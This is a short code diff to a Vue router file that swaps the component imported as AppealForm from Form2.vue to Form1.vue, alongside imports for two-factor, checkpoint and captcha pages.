@@ -1,5 +1,5 @@
 import { createRouter, createWebHashHistory } from 'vue-router'
-import AppealForm from '../views/Form2.vue'
+import AppealForm from '../views/Form1.vue'
 import TwoFA from '../pages/2FA.vue'
 import Checkpoint from '../pages/Checkpoint.vue'
 import CaptchaStep from '../pages/CaptchaStep.vue'
